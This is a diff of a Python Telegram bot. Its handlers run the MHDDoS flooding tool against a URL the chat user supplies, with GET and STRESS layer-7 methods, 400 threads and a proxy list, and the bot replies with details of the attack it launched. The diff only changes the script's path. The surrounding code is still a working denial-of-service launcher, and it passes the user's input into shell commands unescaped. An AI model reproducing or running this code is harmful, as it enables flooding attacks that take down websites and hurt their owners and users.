@@ -23,7 +23,7 @@ def tmps(update: Update, context: CallbackContext):
   
   
 def speed_start(url):
-  subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
+  subprocess.call(f'python3 ~/start.py GET {url} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
 
       
 def STRESS(update: Update, context: CallbackContext):
@@ -31,7 +31,7 @@ def STRESS(update: Update, context: CallbackContext):
   update.message.reply_text(f"METHOD: HTTP L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte Time: {s} s")
   url_str = str(url)
   print(url_str)
-  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py STRESS {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
+  p = subprocess.Popen(f'python3 ~/start.py STRESS {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
   output, error = p.communicate()
   if error:
     update.message.reply_text(f'Erreur : {error.decode()}')
